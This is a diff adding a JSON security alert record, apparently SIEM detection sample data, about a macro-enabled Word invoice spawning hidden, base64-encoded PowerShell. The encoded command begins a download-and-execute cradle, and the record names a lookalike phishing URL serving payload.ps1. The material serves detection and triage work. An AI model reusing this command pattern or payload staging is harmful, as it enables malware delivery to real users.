@@ -1,0 +1,16 @@
+{
+  "search_name": "Suspicious Encoded PowerShell Execution",
+  "urgency": "high",
+  "_time": "2026-10-28T14:32:11.000+03:00",
+  "host": "WS-ACC-017",
+  "user": "CORP\\ivan.petrov",
+  "src_ip": "10.10.20.17",
+  "dest_ip": "185.220.101.45",
+  "process_name": "powershell.exe",
+  "ParentImage": "C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE",
+  "CommandLine": "powershell.exe -nop -w hidden -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkA",
+  "file_name": "invoice_2026.docm",
+  "url": "http://login-micros0ft-helpdesk.com/payload.ps1",
+  "Hashes": "SHA256=9F86D081884C7D659A2FEAA0C55AD015A3BF4F1B2B0B822CD15D6C15B0F00A08",
+  "mitre_technique": ["T1059.001", "T1566.001"]
+}
